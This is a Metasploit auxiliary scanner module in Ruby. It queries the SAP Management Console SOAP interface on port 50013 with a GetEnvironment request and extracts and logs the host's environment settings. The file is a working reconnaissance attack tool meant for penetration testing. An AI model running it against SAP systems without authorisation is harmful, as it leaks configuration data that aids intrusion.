##
# $Id: sap_mgmt_con_getenv.rb 13394 2011-07-28 22:57:47Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'         => 'SAP Management Console getEnvironment',
			'Version'      => '$Revision: 13394 $',
			'Description'  => %q{
				This module simply attempts to identify SAP Environment
				settings through the SAP Management Console SOAP Interface.
				},
			'References'   =>
				[
					# General
					[ 'URL', 'http://blog.c22.cc' ]
				],
			'Author'       => [ 'Chris John Riley' ],
			'License'      => MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(50013),
				OptString.new('URI', [false, 'Path to the SAP Management Console ', '/']),
			], self.class)
		register_autofilter_ports([ 50013 ])
		deregister_options('RHOST')
	end

	def rport
		datastore['RPORT']
	end

	def run_host(ip)
		res = send_request_cgi({
			'uri'      => "/#{datastore['URI']}",
			'method'   => 'GET',
			'headers'  =>
				{
					'User-Agent' => datastore['UserAgent']
				}
		}, 25)
		return if not res

		getEnvironment(ip)
	end

	def getEnvironment(rhost)
		verbose = datastore['VERBOSE']
		print_status("#{rhost}:#{rport} [SAP] Connecting to SAP Management Console SOAP Interface ")
		success = false

		soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'
		xsi = 'http://www.w3.org/2001/XMLSchema-instance'
		xs = 'http://www.w3.org/2001/XMLSchema'
		sapsess = 'http://www.sap.com/webas/630/soap/features/session/'
		ns1 = 'ns1:GetEnvironment'

		data = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n"
		data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="' + soapenv + '"  xmlns:xsi="' + xsi + '" xmlns:xs="' + xs + '">' + "\r\n"
		data << '<SOAP-ENV:Header>' + "\r\n"
		data << '<sapsess:Session xlmns:sapsess="' + sapsess + '">' + "\r\n"
		data << '<enableSession>true</enableSession>' + "\r\n"
		data << '</sapsess:Session>' + "\r\n"
		data << '</SOAP-ENV:Header>' + "\r\n"
		data << '<SOAP-ENV:Body>' + "\r\n"
		data << '<' + ns1 + ' xmlns:ns1="urn:SAPControl"></' + ns1 + '>' + "\r\n"
		data << '</SOAP-ENV:Body>' + "\r\n"
		data << '</SOAP-ENV:Envelope>' + "\r\n\r\n"

		begin
			res = send_request_raw({
				'uri'      => "/#{datastore['URI']}",
				'method'   => 'POST',
				'data'     => data,
				'headers'  =>
					{
						'Content-Length' => data.length,
						'SOAPAction'	=> '""',
						'Content-Type'  => 'text/xml; charset=UTF-8',
					}
			}, 15)

			env = []

			if res.code == 200
				case res.body
				when nil
					# Nothing
				when /<item>([^<]+)<\/item>/i
					body = []
					body = res.body
					env = body.scan(/<item>([^<]+)<\/item>/i)
					success = true
				end
			elsif res.code == 500
				case res.body
				when /<faultstring>(.*)<\/faultstring>/i
					faultcode = $1.strip
					fault = true
				end
			end

		rescue ::Rex::ConnectionError
			print_error("#{rhost}:#{rport} [SAP] Unable to connect")
			return
		end

		if success
			print_good("#{rhost}:#{rport} [SAP] Environment Extracted: #{env.length} entries extracted")
			report_note(
				:host => rhost,
				:proto => 'tcp',
				:port => rport,
				:type => 'sap.env',
				:data => {:proto => "soap", :env => env},
				:update => :unique_data
			)
	
			env.each do |output|
				print_status("#{output}")
			end
	
		elsif fault
			print_error("#{rhost}:#{rport} [SAP] Errorcode: #{faultcode}")
			return
		else
			print_error("#{rhost}:#{rport} [SAP] failed to request environment")
			return
		end
	end
end
